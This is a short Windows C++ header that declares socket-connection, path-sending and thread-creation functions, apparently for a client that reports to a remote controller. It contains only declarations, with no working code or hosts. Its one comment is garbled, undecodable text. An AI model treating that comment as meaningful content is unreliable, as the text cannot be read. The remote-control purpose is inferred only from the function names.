#pragma once
/*
����ˣ������ƶˣ���������ƶ˷������ӣ������������ִ�С�
*/
#include <Winsock2.h>
#include<iostream>
#include<Windows.h>
void connnect();
void sendCurrentPath(SOCKET sock);
DWORD WINAPI Fun(LPVOID lpParameter);
void create_thread();


